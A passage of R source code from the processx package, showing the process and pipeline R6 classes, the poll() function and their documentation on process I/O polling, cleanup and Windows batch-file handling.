
    #' @description Wait for all processes to finish.
    wait = function(timeout = -1) {
      ## Wait for the last process first: it consumes the pipeline output.
      ## Then wait for the rest in reverse order.
      for (p in rev(private$procs)) {
        p$wait(timeout)
      }
      invisible(self)
    },

    #' @description Kill all processes.
    kill = function(grace = 0.1, close_connections = TRUE) {
      for (p in private$procs) p$kill(grace, close_connections)
      invisible(self)
    },

    #' @description Kill all process trees.
    kill_tree = function(grace = 0.1, close_connections = TRUE) {
      for (p in private$procs) p$kill_tree(grace, close_connections)
      invisible(self)
    },

    #' @description Check if any process is still alive.
    is_alive = function() {
      any(vapply(private$procs, function(p) p$is_alive(), logical(1L)))
    },

    ## ------------------------------------------------------------------ ##
    ##  Status / accessors                                                  ##
    ## ------------------------------------------------------------------ ##

    #' @description Return exit codes for all processes.
    get_exit_statuses = function() {
      lapply(private$procs, function(p) p$get_exit_status())
    },

    #' @description Return PIDs for all processes.
    get_pids = function() {
      vapply(private$procs, function(p) p$get_pid(), integer(1L))
    },

    #' @description Return the list of process objects.
    get_processes = function() {
      private$procs
    },

    #' @description Format the pipeline as a string.
    format = function() pipeline_format(self, private),

    #' @description Print the pipeline to the screen.
    print = function(...) pipeline_print(self, private)
  ),

  private = list(
    procs = NULL,
    last  = function() private$procs[[length(private$procs)]]
  )
)
````

### `px390/processx/R/poll.R`

````r
#' Poll for process I/O or termination
#'
#' Wait until one of the specified connections or processes produce
#' standard output or error, terminates, or a timeout occurs.
#'
#' @section Explanation of the return values:
#' * `nopipe` means that the stdout or stderr from this process was not
#'   captured.
#' * `ready` means that the connection or the stdout or stderr from this
#'   process are ready to read from. Note that end-of-file on these
#'   outputs also triggers `ready`.
#' * timeout`: the connections or processes are not ready to read from
#'   and a timeout happened.
#' * `closed`: the connection was already closed, before the polling
#'   started.
#' * `silent`: the connection is not ready to read from, but another
#'   connection was.
#'
#' @param processes A list of connection objects or`process` objects to
#'   wait on. (They can be mixed as well.) If this is a named list, then
#'   the returned list will have the same names. This simplifies the
#'   identification of the processes.
#' @param ms Integer scalar, a timeout for the polling, in milliseconds.
#'   Supply -1 for an infitite timeout, and 0 for not waiting at all.
#' @return A list of character vectors of length one or three.
#'   There is one list element for each connection/process, in the same
#'   order as in the input list. For connections the result is a single
#'   string scalar. For processes the character vectors' elements are named
#'   `output`, `error` and `process`. Possible values for each individual
#'   result are: `nopipe`, `ready`, `timeout`, `closed`, `silent`.
#'   See details about these below. `process` refers to the poll connection,
#'   see the `poll_connection` argument of the `process` initializer.
#'
#' @export
#' @examplesIf FALSE
#' # Different commands to run for windows and unix
#' cmd1 <- switch(
#'   .Platform$OS.type,
#'   "unix" = c("sh", "-c", "sleep 1; ls"),
#'   c("cmd", "/c", "ping -n 2 127.0.0.1 && dir /b")
#' )
#' cmd2 <- switch(
#'   .Platform$OS.type,
#'   "unix" = c("sh", "-c", "sleep 2; ls 1>&2"),
#'   c("cmd", "/c", "ping -n 2 127.0.0.1 && dir /b 1>&2")
#' )
#'
#' ## Run them. p1 writes to stdout, p2 to stderr, after some sleep
#' p1 <- process$new(cmd1[1], cmd1[-1], stdout = "|")
#' p2 <- process$new(cmd2[1], cmd2[-1], stderr = "|")
#'
#' ## Nothing to read initially
#' poll(list(p1 = p1, p2 = p2), 0)
#'
#' ## Wait until p1 finishes. Now p1 has some output
#' p1$wait()
#' poll(list(p1 = p1, p2 = p2), -1)
#'
#' ## Close p1's connection, p2 will have output on stderr, eventually
#' close(p1$get_output_connection())
#' poll(list(p1 = p1, p2 = p2), -1)
#'
#' ## Close p2's connection as well, no nothing to poll
#' close(p2$get_error_connection())
#' poll(list(p1 = p1, p2 = p2), 0)

poll <- function(processes, ms) {
  pollables <- processes
  assert_that(is_list_of_pollables(pollables))
  assert_that(is_integerish_scalar(ms))

  if (length(pollables) == 0) {
    return(structure(list(), names = names(pollables)))
  }

  proc <- vapply(pollables, inherits, logical(1), "process")
  conn <- vapply(pollables, is_connection, logical(1))
  type <- ifelse(proc, 1L, ifelse(conn, 2L, 3L))

  pollables[proc] <- lapply(pollables[proc], function(p) {
    list(get_private(p)$status, get_private(p)$poll_pipe)
  })

  res <- chain_call(c_processx_poll, pollables, type, as.integer(ms))
  res <- lapply(res, function(x) poll_codes[x])
  res[proc] <- lapply(res[proc], function(x) {
    set_names(x, c("output", "error", "process"))
  })
  names(res) <- names(pollables)
  res
}

#' Create a pollable object from a curl multi handle's file descriptors
#'
#' @param fds A list of file descriptors, as returned by
#'   [curl::multi_fdset()].
#' @return Pollable object, that be used with [poll()] directly.
#'
#' @export

curl_fds <- function(fds) {
  structure(
    list(fds$reads, fds$writes, fds$exceptions),
    class = "processx_curl_fds"
  )
}
````

### `px390/processx/R/print.R`

````r
process_format <- function(self, private) {
  state <- if (self$is_alive()) {
    pid <- self$get_pid()
    paste0("running, pid ", paste(pid, collapse = ", "), ".")
  } else {
    "finished."
  }

  paste0(
    "PROCESS ",
    "'",
    private$get_short_name(),
    "', ",
    state,
    "\n"
  )
}

process_print <- function(self, private) {
  cat(process_format(self, private))
  invisible(self)
}

process_get_short_name <- function(self, private) {
  basename(private$command)
}

pipeline_format <- function(self, private) {
  lines <- vapply(private$procs, function(p) {
    sub("^PROCESS ", "| ", p$format())
  }, character(1L))
  paste0(c("PIPELINE\n", lines), collapse = "")
}

pipeline_print <- function(self, private) {
  cat(pipeline_format(self, private))
  invisible(self)
}
````

### `px390/processx/R/process-helpers.R`

````r
process__exists <- function(pid) {
  chain_call(c_processx__process_exists, pid)
}
````

### `px390/processx/R/process.R`

````r
#' @useDynLib processx, .registration = TRUE, .fixes = "c_"
NULL

## Workaround an R CMD check false positive
dummy_r6 <- function() R6::R6Class

#' External process
#'
#' @description
#' Managing external processes from R is not trivial, and this
#' class aims to help with this deficiency. It is essentially a small
#' wrapper around the `system` base R function, to return the process
#' id of the started process, and set its standard output and error
#' streams. The process id is then used to manage the process.
#'
#' @param n Number of characters or lines to read.
#' @param grace Currently not used.
#' @param close_connections Whether to close standard input, standard
#'   output, standard error connections and the poll connection, after
#'   killing the process.
#' @param timeout Timeout in milliseconds, for the wait or the I/O
#'   polling.
#'
#' @section Batch files:
#' Running Windows batch files (`.bat` or `.cmd` files) may be complicated
#' because of the `cmd.exe` command line parsing rules. For example you
#' cannot easily have whitespace in both the command (path) and one of the
#' arguments. To work around these limitations you need to start a
#' `cmd.exe` shell explicitly and use its `call` command. For example:
#'
#' ```r
#' process$new("cmd.exe", c("/c", "call", bat_file, "arg 1", "arg 2"))
#' ```
#'
#' This works even if `bat_file` contains whitespace characters.
#' For more information about this, see this processx issue:
#' https://github.com/r-lib/processx/issues/301
#'
#' The detailed parsing rules are at
#' https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmd
#'
#' A very good practical guide is at
#' https://ss64.com/nt/syntax-esc.html
#'
#' @section Polling:
#' The `poll_io()` function polls the standard output and standard
#' error connections of a process, with a timeout. If there is output
#' in either of them, or they are closed (e.g. because the process exits)
#' `poll_io()` returns immediately.
#'
#' In addition to polling a single process, the [poll()] function
#' can poll the output of several processes, and returns as soon as any
#' of them has generated output (or exited).
#'
#' **Always call `$poll_io()` (or [poll()]) before reading from the
#' stdout or stderr pipes.** The OS pipe buffer is finite (typically 64KB
#' on Linux/macOS, ~76KB on Windows). If the child process fills the pipe
#' buffer before the parent reads from it, the child blocks waiting for
#' the buffer to drain, while the parent may be waiting for the child —
#' resulting in a deadlock. Polling drains the buffer and prevents this.
#' Even a zero-timeout poll (`$poll_io(0)`) is sufficient when you know
#' output is available; use a positive timeout (or `-1` to wait
#' indefinitely) when you need to wait for output to arrive.
#'
#' Note also that `$read_output()` and `$read_error()` may return _less_
#' data than requested: a single call is not guaranteed to return all
#' buffered output. Call them in a loop (polling before each read) until
#' `$is_incomplete_output()` / `$is_incomplete_error()` returns `FALSE`
#' to collect everything. The `$read_all_output()` and
#' `$read_all_error()` helpers already do this for you.
#'
#' @section Cleaning up background processes:
#' processx provides several mechanisms to clean up background processes.
#' See the [Process cleanup](https://processx.r-lib.org/dev/articles/cleanup.html)
#' article for a full discussion. A brief summary:
#'
#' * **Explicit cleanup** (most reliable): call `$kill()` or `$kill_tree()`
#'   from an `on.exit()` expression or error handler:
#' ```r
#' process_manager <- function() {
#'   on.exit({
#'     try(p1$kill(), silent = TRUE)
#'     try(p2$kill(), silent = TRUE)
#'   }, add = TRUE)
#'   p1 <- process$new("sleep", "3")
#'   p2 <- process$new("sleep", "10")
#'   p1$wait()
#'   p2$wait()
#' }
#' process_manager()
#' ```
#'   If you interrupt `process_manager()` or an error happens then both
#'   `p1` and `p2` are cleaned up immediately.
#'
#' * **Automatic GC cleanup** (`cleanup = TRUE`, the default): the process
#'   is killed when the `process` R object is garbage collected. On Unix,
#'   `kill(-pid, SIGKILL)` is used, which kills the child's whole process
#'   group (since the child calls `setsid()` on startup). On Windows, the
#'   child is added to a global Job Object with
#'   `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`, so it is also killed if R exits
#'   or crashes. GC timing is non-deterministic; prefer `on.exit()` when
#'   determinism matters.
#'
#' * **Process tree cleanup** (`cleanup_tree = TRUE`): kills the process
#'   and all its descendants, including orphaned ones. processx marks each
#'   child with a unique environment variable (`PROCESSX_<id>=YES`) that is
#'   inherited by all descendants; `$kill_tree()` uses the _ps_ package to
#'   find and kill every process carrying that variable. On macOS, system
#'   restrictions may prevent reading other processes' environment, so tree
#'   cleanup may not work reliably.
#'
#' * **Linux parent-death signal** (`linux_pdeathsig`): on Linux, the
#'   kernel can send a signal (e.g. `SIGTERM`) to the child when the parent
#'   R process exits, including on crash. Pass `linux_pdeathsig = TRUE` for
#'   `SIGTERM`, or an integer signal number. Ignored on non-Linux platforms.
#'
#' * **Supervisor** (`supervise = TRUE`): a separate native process that
#'   polls every 200 ms and kills registered children if the parent R
#'   process dies (including crashes). On Unix it sends SIGTERM then
#'   (after 5 s) SIGKILL. On Windows it sends CTRL+C / WM_CLOSE then
#'   hard-kills. Note: on Windows, antivirus software may block
#'   `supervisor.exe`.
#'
#' @export
#' @examplesIf identical(Sys.getenv("IN_PKGDOWN"), "true")
#' p <- process$new("sleep", "2")
#' p$is_alive()
#' p
#' p$kill()
#' p$is_alive()
#'
#' p <- process$new("sleep", "1")
#' p$is_alive()
#' Sys.sleep(2)
#' p$is_alive()

process <- R6::R6Class(
  "process",
  public = list(
    #' @description
    #' Start a new process in the background, and then return immediately.
    #'
    #' @return R6 object representing the process.
    #' @param command Character scalar, the command to run.
    #'   Note that this argument is not passed to a shell, so no
    #'   tilde-expansion or variable substitution is performed on it.
    #'   It should not be quoted with [base::shQuote()]. See
    #'   [base::normalizePath()] for tilde-expansion. If you want to run
    #'   `.bat` or `.cmd` files on Windows, make sure you read the
    #'   'Batch files' section above.
    #' @param args Character vector, arguments to the command. They will be
    #'   passed to the process as is, without a shell transforming them,
    #'   They don't need to be escaped.
    #' @param stdin What to do with the standard input. Possible values:
    #'   * `NULL`: set to the _null device_, i.e. no standard input is
    #'     provided;
    #'   * a file name, use this file as standard input;
    #'   * `"|"`: create a (writeable) connection for stdin.
    #'   * `""` (empty string): inherit it from the main R process. If the
    #'     main R process does not have a standard input stream, e.g. in
    #'     RGui on Windows, then an error is thrown.
    #' @param stdout  What to do with the standard output. Possible values:
    #'   * `NULL`: discard it;
    #'   * A string starting with `">>"`, e.g. `">>output.txt"`: append it
    #'     to this file. The file is created if it does not exist.
    #'   * A string (not starting with `">>"`), redirect it to this file,
    #'     truncating the file first.
    #'     Note that if you specify a relative path, it will be relative to
    #'     the current working directory, even if you specify another
    #'     directory in the `wd` argument. (See issue 324.)
    #'   * `"|"`: create a connection for it.
    #'   * `""` (empty string): inherit it from the main R process. If the
    #'     main R process does not have a standard output stream, e.g. in
    #'     RGui on Windows, then an error is thrown.
    #' @param stderr What to do with the standard error. Possible values:
    #'   * `NULL`: discard it.
    #'   * A string starting with `">>"`, e.g. `">>error.txt"`: append it
    #'     to this file. The file is created if it does not exist.
    #'   * A string (not starting with `">>"`), redirect it to this file,
    #'     truncating the file first.
    #'     Note that if you specify a relative path, it will be relative to
    #'     the current working directory, even if you specify another
    #'     directory in the `wd` argument. (See issue 324.)
    #'   * `"|"`: create a connection for it.
    #'   * `"2>&1"`: redirect it to the same connection (i.e. pipe or file)
    #'     as `stdout`. `"2>&1"` is a way to keep standard output and error
    #'     correctly interleaved.
    #'   * `""` (empty string): inherit it from the main R process. If the
    #'     main R process does not have a standard error stream, e.g. in
    #'     RGui on Windows, then an error is thrown.
    #' @param pty Whether to create a pseudo terminal (pty) for the
    #'   background process. This is currently only supported on Unix
    #'   systems, but not supported on Solaris.
    #'   If it is `TRUE`, then the `stdin`, `stdout` and `stderr` arguments
    #'   must be `NULL`. If a pseudo terminal is created, then processx
    #'   will create pipes for standard input and standard output. There is
    #'   no separate pipe for standard error, because there is no way to
    #'   distinguish between stdout and stderr on a pty. Note that the
    #'   standard output connection of the pty is _blocking_, so we always
    #'   poll the standard output connection before reading from it using
    #'   the `$read_output()` method. Also, because `$read_output_lines()`
    #'   could still block if no complete line is available, this function
    #'   always fails if the process has a pty. Use `$read_output()` to
    #'   read from ptys.
    #' @param pty_options Unix pseudo terminal options, a named list. see
    #'   [default_pty_options()] for details and defaults.
    #' @param connections A list of processx connections to pass to the
    #'   child process. This is an experimental feature currently.
    #' @param poll_connection Whether to create an extra connection to the
    #'   process that allows polling, even if the standard input and
    #'   standard output are not pipes. If this is `NULL` (the default),
    #'   then this connection will be only created if standard output and
    #'   standard error are not pipes, and `connections` is an empty list.
    #'   If the poll connection is created, you can query it via
    #'   `p$get_poll_connection()` and it is also included in the response
    #'   to `p$poll_io()` and [poll()]. The numeric file descriptor of the
    #'   poll connection comes right after `stderr` (2), and the
    #'   connections listed in `connections`.
    #' @param env Environment variables of the child process. If `NULL`,
    #'   the parent's environment is inherited. On Windows, many programs
    #'   cannot function correctly if some environment variables are not
    #'   set, so we always set `HOMEDRIVE`, `HOMEPATH`, `LOGONSERVER`,
    #'   `PATH`, `SYSTEMDRIVE`, `SYSTEMROOT`, `TEMP`, `USERDOMAIN`,
    #'   `USERNAME`, `USERPROFILE` and `WINDIR`. To append new environment
    #'   variables to the ones set in the current process, specify
    #'   `"current"` in `env`, without a name, and the appended ones with
    #'   names. The appended ones can overwrite the current ones.
    #' @param cleanup Whether to kill the process when the `process`
    #'   object is garbage collected.
    #' @param cleanup_tree Whether to kill the process and its child
    #'   process tree when the `process` object is garbage collected.
    #' @param wd Working directory of the process. It must exist.
    #'   If `NULL`, then the current working directory is used.
    #' @param echo_cmd Whether to print the command to the screen before
    #'   running it.
    #' @param supervise Whether to register the process with a supervisor.
    #'   If `TRUE`, the supervisor will ensure that the process is
    #'   killed when the R process exits.
    #' @param windows_verbatim_args Whether to omit quoting the arguments
    #'   on Windows. It is ignored on other platforms.
    #' @param windows_hide_window Whether to hide the application's window
    #'   on Windows. It is ignored on other platforms.
    #' @param windows_detached_process Whether to use the
    #'   `DETACHED_PROCESS` flag on Windows. If this is `TRUE`, then
    #'   the child process will have no attached console, even if the
    #'   parent had one.
    #' @param encoding The encoding to assume for `stdin`, `stdout` and
    #'   `stderr`. By default the encoding of the current locale is
    #'   used. Note that `processx` always reencodes the output of the
    #'   `stdout` and `stderr` streams in UTF-8 currently.
    #'   If you want to read them without any conversion, on all platforms,
    #'   specify `"UTF-8"` as encoding. Use `"binary"` to disable text
    #'   conversion entirely: `$read_output()` and `$read_error()` will
    #'   return raw vectors instead of character strings, preserving all
    #'   bytes including null bytes and non-UTF-8 byte sequences.
    #' @param post_process An optional function to run when the process has
    #'   finished. Currently it only runs if `$get_result()` is called.
    #'   It is only run once.
    #' @param linux_pdeathsig On Linux, send this signal to the child process
    #'   when the parent R process exits. `FALSE` (the default) disables this.
    #'   `TRUE` sends `SIGTERM`. An integer signal number, e.g.
    #'   `tools::SIGTERM` or `tools::SIGKILL`, sends that signal. Ignored on
    #'   non-Linux platforms.

    initialize = function(
      command = NULL,
      args = character(),
      stdin = NULL,
      stdout = NULL,
      stderr = NULL,
      pty = FALSE,
      pty_options = list(),
      connections = list(),
      poll_connection = NULL,
      env = NULL,
      cleanup = TRUE,
      cleanup_tree = FALSE,
      wd = NULL,
      echo_cmd = FALSE,
      supervise = FALSE,
      windows_verbatim_args = FALSE,
      windows_hide_window = FALSE,
      windows_detached_process = !cleanup,
      encoding = "",
      post_process = NULL,
      linux_pdeathsig = FALSE
    ) {
      process_initialize(
        self,
        private,
        command,
        args,
        stdin,
        stdout,
        stderr,
        pty,
        pty_options,
        connections,
        poll_connection,
        env,
        cleanup,
        cleanup_tree,
        wd,
        echo_cmd,
        supervise,
        windows_verbatim_args,
        windows_hide_window,
        windows_detached_process,
        encoding,
        post_process,
        linux_pdeathsig
      )
    },

    #' @description
    #' Terminate the process. It also terminate all of its child
    #' processes, except if they have created a new process group (on Unix),
    #' or job object (on Windows). It returns `TRUE` if the process
    #' was terminated, and `FALSE` if it was not (because it was
    #' already finished/dead when `processx` tried to terminate it).

    kill = function(grace = 0.1, close_connections = TRUE) {
      process_kill(self, private, grace, close_connections)
    },

    #' @description
    #' Process tree cleanup. It terminates the process
    #' (if still alive), together with any child (or grandchild, etc.)
    #' processes. It uses the _ps_ package, so that needs to be installed,
    #' and _ps_ needs to support the current platform as well. Process tree
    #' cleanup works by marking the process with an environment variable,
    #' which is inherited in all child processes. This allows finding
    #' descendents, even if they are orphaned, i.e. they are not connected
    #' to the root of the tree cleanup in the process tree any more.
    #' `$kill_tree()` returns a named integer vector of the process ids that
    #' were killed, the names are the names of the processes (e.g. `"sleep"`,
    #' `"notepad.exe"`, `"Rterm.exe"`, etc.).

    kill_tree = function(grace = 0.1, close_connections = TRUE) {
      process_kill_tree(self, private, grace, close_connections)
    },

    #' @description
    #' Send a signal to the process. On Windows only the
    #' `SIGINT`, `SIGTERM` and `SIGKILL` signals are interpreted,
    #' and the special 0 signal. The first three all kill the process. The 0
    #' signal returns `TRUE` if the process is alive, and `FALSE`
    #' otherwise. On Unix all signals are supported that the OS supports,
    #' and the 0 signal as well.
    #' @param signal An integer scalar, the id of the signal to send to
    #'   the process. See [tools::pskill()] for the list of signals.

    signal = function(signal) process_signal(self, private, signal),

    #' @description
    #' Send an interrupt to the process. On Unix this is a
    #' `SIGINT` signal, and it is usually equivalent to pressing CTRL+C at
    #' the terminal prompt. On Windows, it is a CTRL+BREAK keypress.
    #' Applications may catch these events. By default they will quit.

    interrupt = function() process_interrupt(self, private),

    #' @description
    #' Query the process id.
    #' @return Integer scalar, the process id of the process.

    get_pid = function() process_get_pid(self, private),

    #' @description Check if the process is alive.
    #' @return Logical scalar.

    is_alive = function() process_is_alive(self, private),

    #' @description
    #' Wait until the process finishes, or a timeout happens.
    #' Note that if the process never finishes, and the timeout is infinite
    #' (the default), then R will never regain control. In some rare cases,
    #' `$wait()` might take a bit longer than specified to time out. This
    #' happens on Unix, when another package overwrites the processx
    #' `SIGCHLD` signal handler, after the processx process has started.
    #' One such package is parallel, if used with fork clusters, e.g.
    #' through `parallel::mcparallel()`.
    #' @return It returns the process itself, invisibly.

    wait = function(timeout = -1) process_wait(self, private, timeout),

    #' @description
    #' `$get_exit_status` returns the exit code of the process if it has
    #' finished and `NULL` otherwise. On Unix, in some rare cases, the exit
    #' status might be `NA`. This happens if another package (or R itself)
    #' overwrites the processx `SIGCHLD` handler, after the processx process
    #' has started. In these cases processx cannot determine the real exit
    #' status of the process. One such package is parallel, if used with
    #' fork clusters, e.g. through the `parallel::mcparallel()` function.

    get_exit_status = function() process_get_exit_status(self, private),

    #' @description
    #' `format(p)` or `p$format()` creates a string representation of the
    #' process, usually for printing.

    format = function() process_format(self, private),

    #' @description
    #' `print(p)` or `p$print()` shows some information about the
    #' process on the screen, whether it is running and it's process id, etc.

    print = function() process_print(self, private),

    #' @description
    #' `$get_start_time()` returns the time when the process was
    #' started.

    get_start_time = function() process_get_start_time(self, private),

    #' @description
    #' `$get_end_time()` returns the time when the process finished,
    #' or `NULL` if it is still running.
    #' On Unix the timestamp is recorded when R first notices the exit
    #' (via the `SIGCHLD` handler or a call to `$is_alive()`,
    #' `$get_exit_status()`, or `$wait()`), so it may be slightly later
    #' than the actual kernel exit time.
    #' On Windows the exact kernel exit time is used.

    get_end_time = function() process_get_end_time(self, private),

    #' @description
    #' `$is_supervised()` returns whether the process is being tracked by
    #' supervisor process.

    is_supervised = function() process_is_supervised(self, private),

    #' @description
    #' `$supervise()` if passed `TRUE`, tells the supervisor to start
    #' tracking the process. If `FALSE`, tells the supervisor to stop
    #' tracking the process. Note that even if the supervisor is disabled
    #' for a process, if it was started with `cleanup = TRUE`, the process
    #' will still be killed when the object is garbage collected.
    #' @param status Whether to turn on of off the supervisor for this
    #'   process.

    supervise = function(status) process_supervise(self, private, status),

    ## Output

    #' @description
    #' `$read_output()` reads from the standard output connection of the
    #' process. If the standard output connection was not requested, then
    #' then it returns an error. It uses a non-blocking text connection. This
    #' will work only if `stdout="|"` was used. Otherwise, it will throw an
    #' error. When the process was started with `encoding = "binary"`, returns
    #' a raw vector instead of a character string.
    #'
    #' A single call may return less data than requested (or an empty string)
    #' even when more output will eventually arrive: the OS pipe buffer is
    #' finite, and `$read_output()` only returns what is already buffered.
    #' Always call `$poll_io()` (or [poll()]) before reading to avoid
    #' deadlocking when the child fills the pipe buffer (see the _Polling_
    #' section for details). To read _all_ output call `$read_all_output()`.

    read_output = function(n = -1) process_read_output(self, private, n),

    #' @description
    #' `$read_error()` is similar to `$read_output()`, but reads from the
    #' standard error stream. Returns a raw vector when
    #' `encoding = "binary"` was used. The same polling requirement applies
    #' as for `$read_output()` (see the _Polling_ section).

    read_error = function(n = -1) process_read_error(self, private, n),

    #' @description
    #' `$read_output_bytes()` reads from the standard output connection of
    #' the process and returns the result as a raw vector, preserving all
    #' bytes including null bytes and other binary data. Switches the
    #' underlying connection to raw mode; do not mix with `$read_output()`.
    #' This will work only if `stdout="|"` was used.

    read_output_bytes = function(n = -1) {
      process_read_output_bytes(self, private, n)
    },

    #' @description
    #' `$read_error_bytes()` is similar to `$read_output_bytes()`, but reads
    #' from the standard error stream.

    read_error_bytes = function(n = -1) {
      process_read_error_bytes(self, private, n)
    },

    #' @description
    #' `$read_output_lines()` reads lines from standard output connection
    #' of the process. If the standard output connection was not requested,
    #' then it returns an error. It uses a non-blocking text connection.
    #' This will work only if `stdout="|"` was used. Otherwise, it will
    #' throw an error.
    #'
    #' Because `$read_output_lines()` only returns complete lines already in
    #' the buffer, it may return zero lines even when the process has produced
    #' output — for example when a line is longer than the pipe buffer (~64KB
    #' on Linux/macOS, ~76KB on Windows) or when the line is not yet
    #' terminated. Always call `$poll_io()` before reading to avoid
    #' deadlocking (see the _Polling_ section), and use `$read_output()`
    #' when lines may be very long.

    read_output_lines = function(n = -1) {
      process_read_output_lines(self, private, n)
    },

    #' @description
    #' `$read_error_lines()` is similar to `$read_output_lines`, but
    #' it reads from the standard error stream. The same polling requirement
    #' applies (see the _Polling_ section).

    read_error_lines = function(n = -1) {
      process_read_error_lines(self, private, n)
    },

    #' @description
    #' `$is_incomplete_output()` return `FALSE` if the other end of
    #' the standard output connection was closed (most probably because the
    #' process exited). It return `TRUE` otherwise.

    is_incomplete_output = function() {
      process_is_incompelete_output(self, private)
    },

    #' @description
    #' `$is_incomplete_error()` return `FALSE` if the other end of
    #' the standard error connection was closed (most probably because the
    #' process exited). It return `TRUE` otherwise.

    is_incomplete_error = function() {
      process_is_incompelete_error(self, private)
    },

    #' @description
    #' `$has_input_connection()` return `TRUE` if there is a connection
    #' object for standard input; in other words, if `stdout="|"`. It returns
    #' `FALSE` otherwise.

    has_input_connection = function() {
      process_has_input_connection(self, private)
    },

    #' @description
    #' `$has_output_connection()` returns `TRUE` if there is a connection
    #' object for standard output; in other words, if `stdout="|"`. It returns
    #' `FALSE` otherwise.

    has_output_connection = function() {
      process_has_output_connection(self, private)
    },

    #' @description
    #' `$has_error_connection()` returns `TRUE` if there is a connection
    #' object for standard error; in other words, if `stderr="|"`. It returns
    #' `FALSE` otherwise.

    has_error_connection = function() {
      process_has_error_connection(self, private)
    },

    #' @description
    #' `$has_poll_connection()` return `TRUE` if there is a poll connection,
    #' `FALSE` otherwise.

    has_poll_connection = function() process_has_poll_connection(self, private),

    #' @description
    #' `$get_input_connection()` returns a connection object, to the
    #' standard input stream of the process.

    get_input_connection = function() {
      process_get_input_connection(self, private)
    },

    #' @description
    #' `$get_output_connection()` returns a connection object, to the
    #' standard output stream of the process.

    get_output_connection = function() {
      process_get_output_connection(self, private)
    },

    #' @description
    #' `$get_error_conneciton()` returns a connection object, to the
    #' standard error stream of the process.

    get_error_connection = function() {
      process_get_error_connection(self, private)
    },

    #' @description
    #' `$read_all_output()` waits for all standard output from the process.
    #' It does not return until the process has finished.
    #' Note that this process involves waiting for the process to finish,
    #' polling for I/O and potentially several `readLines()` calls.
    #' It returns a character scalar. This will return content only if
    #' `stdout="|"` was used. Otherwise, it will throw an error.

    read_all_output = function() process_read_all_output(self, private),

    #' @description
    #' `$read_all_error()` waits for all standard error from the process.
    #' It does not return until the process has finished.
    #' Note that this process involves waiting for the process to finish,
    #' polling for I/O and potentially several `readLines()` calls.
    #' It returns a character scalar. This will return content only if
    #' `stderr="|"` was used. Otherwise, it will throw an error.

    read_all_error = function() process_read_all_error(self, private),

    #' @description
    #' `$read_all_output_lines()` waits for all standard output lines
    #' from a process. It does not return until the process has finished.
    #' Note that this process involves waiting for the process to finish,
    #' polling for I/O and potentially several `readLines()` calls.
    #' It returns a character vector. This will return content only if
    #' `stdout="|"` was used. Otherwise, it will throw an error.

    read_all_output_lines = function() {
      process_read_all_output_lines(self, private)
    },

    #' @description
    #' `$read_all_error_lines()` waits for all standard error lines from
    #' a process. It does not return until the process has finished.
    #' Note that this process involves waiting for the process to finish,
    #' polling for I/O and potentially several `readLines()` calls.
    #' It returns a character vector. This will return content only if
    #' `stderr="|"` was used. Otherwise, it will throw an error.

    read_all_error_lines = function() {
      process_read_all_error_lines(self, private)
    },

    #' @description
    #' `$write_input()` writes the character vector (separated by `sep`) to
    #' the standard input of the process. It will be converted to the specified
    #' encoding. This operation is non-blocking, and it will return, even if
    #' the write fails (because the write buffer is full), or if it suceeds
    #' partially (i.e. not the full string is written). It returns with a raw
    #' vector, that contains the bytes that were not written. You can supply
    #' this raw vector to `$write_input()` again, until it is fully written,
    #' and then the return value will be `raw(0)` (invisibly).
    #'
    #' @param str Character or raw vector to write to the standard input
    #'   of the process. If a character vector with a marked encoding,
    #'   it will be converted to `encoding`.
    #' @param sep Separator to add between `str` elements if it is a
    #'   character vector. It is ignored if `str` is a raw vector.
    #' @return Leftover text (as a raw vector), that was not written.

    write_input = function(str, sep = "\n") {
      process_write_input(self, private, str, sep)
    },

    #' @description
    #' `$get_input_file()` if the `stdin` argument was a filename,
    #' this returns the absolute path to the file. If `stdin` was `"|"` or
    #' `NULL`, this simply returns that value.

    get_input_file = function() process_get_input_file(self, private),

    #' @description
    #' `$get_output_file()` if the `stdout` argument was a filename,
    #' this returns the absolute path to the file. If `stdout` was `"|"` or
    #' `NULL`, this simply returns that value.

    get_output_file = function() process_get_output_file(self, private),

    #' @description
    #' `$get_error_file()` if the `stderr` argument was a filename,
    #' this returns the absolute path to the file. If `stderr` was `"|"` or
    #' `NULL`, this simply returns that value.

    get_error_file = function() process_get_error_file(self, private),

    #' @description
    #' `$poll_io()` polls the process's connections for I/O. See more in
    #' the _Polling_ section, and see also the [poll()] function
    #' to poll on multiple processes.

    poll_io = function(timeout) process_poll_io(self, private, timeout),

    #' @description
    #' `$get_poll_connetion()` returns the poll connection, if the process has
    #' one.

    get_poll_connection = function() process_get_poll_connection(self, private),

    #' @description
    #' `$get_result()` returns the result of the post processesing function.
    #' It can only be called once the process has finished. If the process has
    #' no post-processing function, then `NULL` is returned.

    get_result = function() process_get_result(self, private),

    #' @description
    #' `$as_ps_handle()` returns a [ps::ps_handle] object, corresponding to
    #' the process.

    as_ps_handle = function() process_as_ps_handle(self, private),

    #' @description
    #' Calls [ps::ps_name()] to get the process name.

    get_name = function() ps_method(ps::ps_name, self, private),

    #' @description
    #' Calls [ps::ps_exe()] to get the path of the executable.

    get_exe = function() ps_method(ps::ps_exe, self, private),

    #' @description
    #' Calls [ps::ps_cmdline()] to get the command line.

    get_cmdline = function() ps_method(ps::ps_cmdline, self, private),

    #' @description
    #' Calls [ps::ps_status()] to get the process status.

    get_status = function() ps_method(ps::ps_status, self, private),

    #' @description
    #' calls [ps::ps_username()] to get the username.

    get_username = function() ps_method(ps::ps_username, self, private),

    #' @description
    #' Calls [ps::ps_cwd()] to get the current working directory.

    get_wd = function() ps_method(ps::ps_cwd, self, private),

    #' @description
    #' Calls [ps::ps_cpu_times()] to get CPU usage data.

    get_cpu_times = function() ps_method(ps::ps_cpu_times, self, private),

    #' @description
    #' Calls [ps::ps_memory_info()] to get memory data.

    get_memory_info = function() ps_method(ps::ps_memory_info, self, private),

    #' @description
    #' Calls [ps::ps_suspend()] to suspend the process.

    suspend = function() ps_method(ps::ps_suspend, self, private),

    #' @description
    #' Calls [ps::ps_resume()] to resume a suspended process.

    resume = function() ps_method(ps::ps_resume, self, private)
  ),

  private = list(
    command = NULL, # Save 'command' argument here
    args = NULL, # Save 'args' argument here
    cleanup = NULL, # cleanup argument
    cleanup_tree = NULL, # cleanup_tree argument
    stdin = NULL, # stdin argument or stream
    stdout = NULL, # stdout argument or stream
    stderr = NULL, # stderr argument or stream
    pty = NULL, # whether we should create a PTY
    pty_options = NULL, # various PTY options
    pstdin = NULL, # the original stdin argument
    pstdout = NULL, # the original stdout argument
    pstderr = NULL, # the original stderr argument
